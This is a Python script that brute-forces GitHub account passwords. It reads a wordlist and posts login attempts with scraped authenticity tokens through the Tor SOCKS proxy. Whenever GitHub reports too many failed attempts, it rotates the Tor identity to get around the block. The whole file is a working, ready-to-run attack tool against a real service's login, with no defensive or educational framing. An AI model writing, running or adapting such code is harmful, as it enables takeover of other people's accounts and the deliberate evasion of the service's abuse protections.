#!/usr/bin/python

import sys
import requests
import progressbar
import time
from requests import session
from bs4 import BeautifulSoup as bs
from stem import Signal
from stem.control import Controller

global proxy
proxy = {
    'http':  'socks5://localhost:9050',
    'https': 'socks5://localhost:9050',
}

URL = 'https://github.com/session'

#PASSWORD = 'testrandompassword'
#userlist = open('users.txt', 'r')

def gitbrute(URL):
	USER = sys.argv[1]
	counter = 0
	passwordlist = open('passwords.txt', 'r')
	for PASSWORD in passwordlist.readlines():
	#for USER in userlist.readlines():
		with session() as s:
			counter += 1
			req = s.get(URL, proxies=proxy).text
			html = bs(req, "html.parser")
			token = html.find("input", {"name": "authenticity_token"}).attrs['value']
			com_val = html.find("input", {"name": "commit"}).attrs['value']
			login_data = {'login': USER,
                    		'password': PASSWORD.rstrip(),
                    		'commit' : com_val,
                    		'authenticity_token' : token}
			r1 = s.post(URL, data = login_data, proxies=proxy)
			#print(r1.text)
			if str("logged-in env-production") in r1.text:
            			print(f'Request {counter}: Successful login for {USER} using {PASSWORD}')
			elif str("Incorrect username or password") in r1.text:
        			print(f'Request {counter}: Failed login for {USER}')
			elif str("There have been several failed attempts to sign in from this account or IP address.") in r1.text:
				print(f'Request {counter}: Failed login for {USER}. Github is blocking our requests.')
				requestNewIdentity()
				checkIdentity()

def progressAnimated():
	widgets = ['Requesting new identity..', progressbar.AnimatedMarker(". ")]
	bar = progressbar.ProgressBar(widgets=widgets).start()
	for i in range(20):
		time.sleep(.5)
		bar.update(i)
	print(' ')

def requestNewIdentity():
	with Controller.from_port(port = 9051) as controller:
		controller.authenticate("CTRL_PASSWORD") #change me
		controller.signal(Signal.NEWNYM)
	progressAnimated()

def checkIdentity():
	urlCheck = "https://icanhazip.com/"
	with session() as s:
		newIP = s.get(urlCheck, proxies=proxy).text
		print(f'Now using {newIP}')

print("Running..")
gitbrute(URL)
